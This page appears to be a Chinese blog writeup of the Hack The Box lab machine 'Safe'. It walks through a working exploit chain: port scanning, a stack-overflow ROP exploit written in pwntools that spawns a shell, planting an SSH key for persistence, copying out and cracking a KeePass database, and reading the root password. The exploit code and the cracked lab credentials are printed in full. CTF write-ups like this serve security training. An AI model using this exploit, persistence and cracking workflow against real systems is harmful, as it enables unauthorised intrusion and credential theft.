<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="preload" as="font" href="/_next/static/media/2aaf0723e720e8b9-s.p.woff2" crossorigin="" type="font/woff2"/><link rel="stylesheet" href="/_next/static/css/7049305331e382c9.css" data-precedence="next"/><title>HTB safe Writeup</title><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="any"/><meta name="next-size-adjust"/><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" noModule=""></script></head><body class="antialiased min-h-screen bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-50 bg-grey __className_0ec1f4"><script>!function(){try{var d=document.documentElement,c=d.classList;c.remove('light','dark');var e=localStorage.getItem('theme');if('system'===e||(!e&&true)){var t='(prefers-color-scheme: dark)',m=window.matchMedia(t);if(m.media!==t||m.matches){d.style.colorScheme = 'dark';c.add('dark')}else{d.style.colorScheme = 'light';c.add('light')}}else if(e){c.add(e|| '')}if(e==='light'||e==='dark')d.style.colorScheme=e}catch(e){}}()</script><div class="my-max mx-auto py-10 px-4"><header><div class="my-flex"><nav class="nav-ml text-sm font-medium space-x-6"><a href="/">Home</a><a href="/about">About</a></nav></div></header><main><div class="js-toc my-toc"></div><article class="py-6 prose post-prose dark:prose-invert"><div class="post-title">HTB safe Writeup</div><time dateTime="2019-12-14T19:07:29.000Z" class="post-time">December 14, 2019</time><div class="js-toc-content"><h1 id="前言">前言</h1>
<p>这是一篇writeup，靶机是来自hackthebox的<a href="https://www.hackthebox.eu/home/machines/profile/199">safe</a></p>
<h1 id="信息收集">信息收集</h1>
<p>一开始扫全端口，不知道是不是网络问题，怎么都扫不完，后来限制了一下速率：</p>
<pre><code class="hljs language-bash">kali at ~/htb/safe ❯ nmap -p- --min-rate 10000 -sV -sC -sS 10.10.10.147
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 22:27 EST
Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.147
Host is up (7.6s latency).
Not shown: 61065 filtered ports, 4468 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>只有22端口和80端口，看来只能从Web入手了，大便系统上搭的apache</p>
<h3 id="为什么没扫出来1337端口">为什么没扫出来1337端口</h3>
<p>在后续的发现中是还有一个1337端口是开放的，后面看别人的Writeup也有部分Writeup是可以扫出来1337端口的，为啥我这里没有扫出来呢？原因在于应使用<code>-PN</code>参数：</p>
<pre><code class="hljs language-bash">kali at ~/htb/safe ❯ nmap -Pn -p1337 10.10.10.147
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 23:01 EST
Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.147
Host is up (0.45s latency).

PORT     STATE SERVICE
1337/tcp open  waste

Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.67 seconds
kali at ~/htb/safe ❯ nmap -p1337 10.10.10.147
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 23:01 EST
Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.147
Host is up (0.00029s latency).

PORT     STATE    SERVICE
1337/tcp filtered waste

Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.69 seconds
</code></pre>
<p>默认下nmap是会先探测主机是否存活，使用<code>-Pn</code>会跳过主机探测的步骤（也就是不Ping）。但是这里有点疑惑的这个IP本身就是可以Ping的，所以理论上跳不跳过主机探测不都是一样的吗？为什么用不用<code>-Pn</code>参数的效果不一样呢？</p>
<h1 id="web">Web</h1>
<p>打开只有一个大便Apache的默认页面：</p>
<p><img src="/6.jpg" alt=""/></p>
<p>看到这个页面就觉得应该是要扫一下目录：</p>
<pre><code class="hljs language-bash">⇒  python dirsearch.py -u http://10.10.10.147 -e *

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6103

Error Log: /Users/danta/Code/dirsearch/logs/errors-19-12-14_19-09-19.<span class="hljs-built_in">log</span>

Target: http://10.10.10.147

[19:09:20] Starting:
[19:09:33] 403 -  291B  - /.hta
[19:09:33] 403 -  300B  - /.htaccess.BAK
[19:09:33] 403 -  301B  - /.htaccess.bak1
[19:09:33] 403 -  302B  - /.htaccess-marco
[19:09:33] 403 -  300B  - /.htaccess-dev
[19:09:33] 403 -  302B  - /.htaccess-local
[19:09:33] 403 -  298B  - /.ht_wsr.txt
[19:09:33] 403 -  300B  - /.htaccess.old
[19:09:33] 403 -  301B  - /.htaccess.orig
[19:09:33] 403 -  301B  - /.htaccess.save
[19:09:33] 403 -  303B  - /.htaccess.sample
[19:09:33] 403 -  300B  - /.htaccess.txt
[19:09:33] 403 -  299B  - /.htaccess_sc
[19:09:33] 403 -  299B  - /.htaccessBAK
[19:09:33] 403 -  302B  - /.htaccess_extra
[19:09:33] 403 -  301B  - /.htaccess_orig
[19:09:34] 403 -  300B  - /.htaccessOLD2
[19:09:34] 403 -  295B  - /.htgroup
[19:09:34] 403 -  297B  - /.htaccess~
[19:09:34] 403 -  299B  - /.htaccessOLD
[19:09:34] 403 -  300B  - /.htpasswd-old
[19:09:34] 403 -  301B  - /.htpasswd_test
[19:09:35] 403 -  297B  - /.htpasswds
[19:09:35] 403 -  295B  - /.htusers
[19:12:31] 200 -   11KB - /index.html
[19:12:56] 301 -  313B  - /manual  -&gt;  http://10.10.10.147/manual/
[19:12:56] 200 -  626B  - /manual/index.html
[19:13:53] 403 -  300B  - /server-status
[19:13:53] 403 -  301B  - /server-status/

Task Completed
</code></pre>
<p>打开<code>/manual</code>看看，发现是apache的文档页面，又是默认页面。后来又换了一些字典，发现还是相同的结果。想来想去也没有别的入口的，后来看看别人的writeup才发现原来还可以这样。。。</p>
<p>查看首页的源码：</p>
<p><img src="/8.jpg" alt=""/></p>
<p>里面说还有个1337端口，而且这个程序还可以通过访问路径<code>myapp</code>下载。我是真没想到还可以修改默认页面，看来真是每个细节都不能放过。。</p>
<p>下载myapp后查看是个可执行文件，执行一下看看，然后再看看1337端口</p>
<pre><code class="hljs language-bash">kali at ~/htb/safe ❯ file myapp
myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
kali at ~/htb/safe ❯ <span class="hljs-built_in">chmod</span> u+x myapp
kali at ~/htb/safe ❯ ./myapp
 00:23:04 up 1 day, 23:52,  3 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00

What <span class="hljs-keyword">do</span> you want me to <span class="hljs-built_in">echo</span> back? <span class="hljs-built_in">ls</span>
<span class="hljs-built_in">ls</span>
kali at ~/htb/safe ❯ nc 10.10.10.147 1337
 00:26:35 up 18:21,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00
<span class="hljs-built_in">ls</span>

What <span class="hljs-keyword">do</span> you want me to <span class="hljs-built_in">echo</span> back? <span class="hljs-built_in">ls</span>
</code></pre>
<p>到这一步后我有点意外...这不就是一道pwn题吗....</p>
<h1 id="通过栈溢出getshell">通过栈溢出GetShell</h1>
<p>到现在我们知道1337端口的程序就是<code>myapp</code>，就目前所知的是这个程序会输出我们输入的东西。看起来就是一个栈溢出的题目。</p>
<p>使用checksec查看表示开启了NX，但是没有其他的保护了。栈溢出的利用方式大概有4种（<a href="https://paper.seebug.org/271/">手把手教你栈溢出从入门到放弃（上）</a>，<a href="https://paper.seebug.org/272/">手把手教你栈溢出从入门到放弃（下）</a>）。NX开启了意味着栈上不能执行shellcode，这儿又不知道所用的动态库的版本，没办法用return2libc方法。所以只能用rop的方式。</p>
<pre><code class="hljs language-bash">root@kali:htb/safe <span class="hljs-comment"># gdb -q myapp</span>
Reading symbols from myapp...
(No debugging symbols found <span class="hljs-keyword">in</span> myapp)
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre>
<p>要利用ROP来getshell，我们需要确定两件事：一个是溢出数据的长度，另一个是<code>gadget</code>（某段指令）的地址。</p>
<h2 id="确定溢出长度">确定溢出长度</h2>
<p>给<code>gdb</code>装上 <a href="https://github.com/longld/peda">Peda</a> 插件，可以很简单即可确定溢出长度。这里需要注意的是，gdb在调试多进程的时候，默认会只调试主进程，而peda是会继续跟踪子进程（<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gdbmp/index.html">相关</a>）。在这个程序中，因为多进程的原因导致程序直接退出了，所以先设置了一下<code>set follow-fork-mode parent</code>来保证peda只调试主进程。</p>
<pre><code class="hljs language-bash">root@kali:htb/safe <span class="hljs-comment"># gdb -q myapp</span>
Reading symbols from myapp...
(No debugging symbols found <span class="hljs-keyword">in</span> myapp)
gdb-peda$ <span class="hljs-built_in">set</span> follow-fork-mode parent
gdb-peda$ pattern_create 200
<span class="hljs-string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#x27;</span>
gdb-peda$ r
Starting program: /root/htb/safe/myapp
[Detaching after vfork from child process 79586]
 03:15:51 up 2 days,  2:44,  3 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00

What <span class="hljs-keyword">do</span> you want me to <span class="hljs-built_in">echo</span> back? AAA%AAsAABAA<span class="hljs-variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AAA%AAsAABAA<span class="hljs-variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7ee0904 (&lt;__GI___libc_write+20&gt;:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7fb1580 --&gt; 0x0
RSI: 0x405260 (<span class="hljs-string">&quot;AAA%AAsAABAA<span class="hljs-variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>...)
RDI: 0x0
RBP: 0x41414e4141384141 (<span class="hljs-string">&#x27;AA8AANAA&#x27;</span>)
RSP: 0x7fffffffe348 (<span class="hljs-string">&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)
RIP: 0x4011ac (&lt;main+77&gt;:	ret)
R8 : 0xc9
R9 : 0x0
R10: 0x4003e0 --&gt; 0x6972700073747570 (<span class="hljs-string">&#x27;puts&#x27;</span>)
R11: 0x246
R12: 0x401070 (&lt;_start&gt;:	xor    ebp,ebp)
R13: 0x7fffffffe420 --&gt; 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 &lt;main+66&gt;:	call   0x401030 &lt;puts@plt&gt;
   0x4011a6 &lt;main+71&gt;:	mov    eax,0x0
   0x4011ab &lt;main+76&gt;:	leave
=&gt; 0x4011ac &lt;main+77&gt;:	ret
   0x4011ad:	nop    DWORD PTR [rax]
   0x4011b0 &lt;__libc_csu_init&gt;:	push   r15
   0x4011b2 &lt;__libc_csu_init+2&gt;:	mov    r15,rdx
   0x4011b5 &lt;__libc_csu_init+5&gt;:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe348 (<span class="hljs-string">&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)
0008| 0x7fffffffe350 (<span class="hljs-string">&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)
0016| 0x7fffffffe358 (<span class="hljs-string">&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)
0024| 0x7fffffffe360 (<span class="hljs-string">&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)
0032| 0x7fffffffe368 (<span class="hljs-string">&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)
0040| 0x7fffffffe370 (<span class="hljs-string">&quot;AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)
0048| 0x7fffffffe378 (<span class="hljs-string">&quot;VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)
0056| 0x7fffffffe380 (<span class="hljs-string">&quot;AuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac <span class="hljs-keyword">in</span> main ()
</code></pre>
<p>可以看到输入了200个长度的字符串后引起了程序的报错（因为程序的返回地址被刚输入的字符串覆盖了，一个错误的地址导致了异常退出，这个错误的地址就是栈顶的值。），这时候我们取到栈顶的值来计算溢出长度。</p>
<pre><code class="hljs language-bash">gdb-peda$ pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120
gdb-peda$ pattern_create
</code></pre>
<p>得到溢出长度120。</p>
<h2 id="选择gadgets">选择Gadgets</h2>
<p>最终的目的是要获取shell，所以需要执行类似<code>system(&quot;/bin/sh&quot;)</code>的方法来获得一个shell，因为可以通过栈溢出控制程序执行流程，那么我就还需要两个东西：一个是system函数的地址，一个是&quot;/bin/sh&quot;字符串的地址。</p>
<p>先看一下程序本身有什么函数可以用：</p>
<pre><code class="hljs language-bash">gdb-peda$ info <span class="hljs-built_in">functions</span>
All defined <span class="hljs-built_in">functions</span>:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  <span class="hljs-built_in">printf</span>@plt
0x0000000000401060  gets@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401152  <span class="hljs-built_in">test</span>
0x000000000040115f  main
0x00000000004011b0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401214  _fini
</code></pre>
<p>有<code>system</code>，<code>gets</code>方法，所以可以调用通过gets方法读取<code>/bin/sh</code>，然后通过system调用。</p>
<p>通过使用ida反编译的时候可以看到程序的<code>.data</code>段是可写的，并且获取到地址为<code>0x404038h</code>。所以我们可以通过调用<code>gets</code>函数将<code>/bin/sh</code>写入到<code>0x404038h</code>中，然用调用<code>system(0x404038h)</code>即可。另外我们还需要一个跳转到<code>gets</code>函数的gadgets。</p>
<p>使用<a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>可以很方便地找到这个Gadgets：</p>
<pre><code class="hljs language-bash">root@kali:htb/safe <span class="hljs-comment"># ROPgadget --binary myapp --only &quot;pop|ret&quot; | grep rdi</span>
0x000000000040120b : pop rdi ; ret
</code></pre>
<p>按照这个思路写的exp：</p>
<pre><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>)
<span class="hljs-comment">#context(log_level=&#x27;DEBUG&#x27;)</span>

junk = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">120</span>

plt_gets = p64(<span class="hljs-number">0x401060</span>)
plt_system = p64(<span class="hljs-number">0x401040</span>)
pop_rdi = p64(<span class="hljs-number">0x40120b</span>)
binsh = p64(<span class="hljs-number">0x404038</span>)

payload = junk + pop_rdi + binsh + plt_gets + pop_rdi + binsh + plt_system

p = remote(<span class="hljs-string">&quot;10.10.10.147&quot;</span>, <span class="hljs-number">1337</span>)
p.recvline()
p.sendline(payload)
p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)
p.interactive()
</code></pre>
<p>这里Gadgets并不是唯一的，当可利用的Gadgets很多时，getshell的方法也不止一种，这里国外一个叫大佬写了几种其他的方法：<a href="https://0xdf.gitlab.io/2019/10/26/htb-safe.html">https://0xdf.gitlab.io/2019/10/26/htb-safe.html</a></p>
<pre><code class="hljs language-bash">root@kali:htb/safe <span class="hljs-comment"># python exp1.py</span>
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
$ <span class="hljs-built_in">whoami</span>
user
</code></pre>
<h1 id="提权">提权</h1>
<p>刚刚翻看服务器的时候看到家目录下有几张图片和<code>MyPasswords.kdbx</code>（这个不就是我因为记不住密码用的密码管理器，最后因为记不住密码管理器的密码导致所有密码都丢了的KeePass吗）</p>
<pre><code class="hljs language-bash">$ <span class="hljs-built_in">ls</span>
IMG_0545.JPG
IMG_0546.JPG
IMG_0547.JPG
IMG_0548.JPG
IMG_0552.JPG
IMG_0553.JPG
myapp
MyPasswords.kdbx
user.txt
</code></pre>
<p>有好几张图片，有个kdbx数据库，这个意思就蛮明显的了吧：kdbx是通过密码+图片来保护的。通过刚刚的方法获得shell之后，因为这台机子还开了22端口，所以可以将自己的公钥复制进来，就可以通过ssh连接了，然后下载文件下来进行爆破。</p>
<pre><code class="hljs language-bash">root@kali:htb/safe <span class="hljs-comment"># cat ~/.ssh/id_rsa.pub | base64 -w0</span>
c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUmZBbjhSK0FtWWV4RkJUdW1zTDBUekJOTHJCOUs1NG1VT1JBa1l3T3JOcDNrYnhrejBvWHlGckR0cGdWc2pWdDQ4SkFRS0J2UXBCMmlBY3ZoYk5mZjRwVTJhdWZmMkZ4Z....(省略)
</code></pre>
<pre><code class="hljs language-bash">$ <span class="hljs-built_in">echo</span> c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUmZBbjhSK0FtWWV4RkJUdW1zTDBUekJOTHJCOUs1NG1VT1JBa1l3T3JOcDNrYnhrejBvWHlGckR0cGdWc2pWdDQ4SkFRS0J2UXBCMmlBY3ZoYk5mZjRwVTJhdWZmMkZ4Z....(省略) | <span class="hljs-built_in">base64</span> -d &gt;&gt; /home/user/.ssh/authorized_keys
</code></pre>
<pre><code class="hljs language-bash">root@kali<span class="hljs-comment"># scp -i ~/id_rsa_generated user@10.10.10.147:~/IMG* .</span>
IMG_0545.JPG                                                       100% 1863KB 944.7KB/s   00:01    
IMG_0546.JPG                                                       100% 1872KB   1.6MB/s   00:01    
IMG_0547.JPG                                                       100% 2470KB   2.0MB/s   00:01    
IMG_0548.JPG                                                       100% 2858KB   1.5MB/s   00:01    
IMG_0552.JPG                                                       100% 1099KB   1.6MB/s   00:00    
IMG_0553.JPG                                                       100% 1060KB   2.3MB/s   00:00    
root@kali<span class="hljs-comment"># scp -i ~/id_rsa_generated user@10.10.10.147:~/*.kdbx .</span>
MyPasswords.kdbx                                                   100% 2446
</code></pre>
<p>使用keepass2john来生成hash文件：</p>
<pre><code class="hljs language-bash">root@kali<span class="hljs-comment"># keepass2john MyPasswords.kdbx &gt; MyPasswords.kdbx.john; for img in $(ls IMG*); do /opt/john/run/keepass2john -k $img MyPasswords.kdbx; done &gt;&gt; MyPasswords.kdbx.john</span>

root@kali<span class="hljs-comment"># cat MyPasswords.kdbx.john </span>
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2
</code></pre>
<p>做过几台htb的机子后感觉这里的爆破都用<code>rockyou.txt</code>字典都能跑出来（不过rockyou.txt有点大，先从小的试起），使用<code>john</code>来爆破：</p>
<pre><code class="hljs language-bash">root@kali<span class="hljs-comment"># john MyPasswords.kdbx.john /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt </span>
Warning: only loading hashes of <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;KeePass&quot;</span>, but also saw <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;tripcode&quot;</span>
Use the <span class="hljs-string">&quot;--format=tripcode&quot;</span> option to force loading hashes of that <span class="hljs-built_in">type</span> instead
Warning: only loading hashes of <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;KeePass&quot;</span>, but also saw <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;descrypt&quot;</span>
Use the <span class="hljs-string">&quot;--format=descrypt&quot;</span> option to force loading hashes of that <span class="hljs-built_in">type</span> instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (KeePass [SHA256 AES 32/64 OpenSSL])
Cost 1 (iteration count) is 60000 <span class="hljs-keyword">for</span> all loaded hashes
Cost 2 (version) is 2 <span class="hljs-keyword">for</span> all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 <span class="hljs-keyword">for</span> all loaded hashes
Will run 3 OpenMP threads
Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status
bullshit         (MyPasswords)
1g 0:00:01:20 0.47% 2/3 (ETA: 15:46:09) 0.01239g/s 91.21p/s 154.1c/s 154.1C/s emerald..francesco
Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably
Session aborted
</code></pre>
<p>拿到密码后打开密码管理器看看</p>
<pre><code class="hljs language-bash">root@kali<span class="hljs-comment"># kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx</span>
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready <span class="hljs-keyword">for</span> operation.
Type <span class="hljs-string">&#x27;help&#x27;</span> <span class="hljs-keyword">for</span> a description of available commands.
Type <span class="hljs-string">&#x27;help &lt;command&gt;&#x27;</span> <span class="hljs-keyword">for</span> details on individual commands.

kpcli:/&gt; <span class="hljs-built_in">ls</span>
=== Groups ===
MyPasswords/
kpcli:/&gt; <span class="hljs-built_in">cd</span> MyPasswords/
kpcli:/MyPasswords&gt; <span class="hljs-built_in">ls</span>
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. Root password
kpcli:/MyPasswords&gt; show -f R
Recycle\ Bin/   Root\ password
kpcli:/MyPasswords&gt; show -f Root\ password

 Path: /MyPasswords/
Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL:
Notes:
</code></pre>
<p>使用<code>su -</code>命令提权：</p>
<pre><code class="hljs language-bash">user@safe:~$ su -
Password:
root@safe:~<span class="hljs-comment"># cat root.txt</span>
d7af235eb1.....
</code></pre></div></article></main></div><script src="/_next/static/chunks/webpack-7ba84a1b7b37c561.js" async=""></script><script src="/_next/static/chunks/2443530c-ac8981f6a5707b30.js" async=""></script><script src="/_next/static/chunks/139-1dec130228ce3944.js" async=""></script><script src="/_next/static/chunks/main-app-2fe6bc2bab605f4b.js" async=""></script></body></html><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/2aaf0723e720e8b9-s.p.woff2\",{\"as\":\"font\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/css/7049305331e382c9.css\",{\"as\":\"style\"}]\n0:\"$L3\"\n"])</script><script>self.__next_f.push([1,"4:I{\"id\":\"7858\",\"chunks\":[\"272:static/chunks/webpack-7ba84a1b7b37c561.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n6:I{\"id\":\"3055\",\"chunks\":[\"272:static/chunks/webpack-7ba84a1b7b37c561.js\",\"667:static/chunks/2443530c-ac8981f6a5707b30.js\",\"139:static/chunks/139-1dec130228ce3944.js\"],\"name\":\"\",\"async\":false}\n7:I{\"id\":\"350\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832af9.js\",\"185:static/chunks/app/layout-4bf769380402ef59.js\"],\"name"])</script><script>self.__next_f.push([1,"\":\"ThemeProvider\",\"async\":false}\n8:I{\"id\":\"414\",\"chunks\":[\"414:static/chunks/414-bfaafd372e832a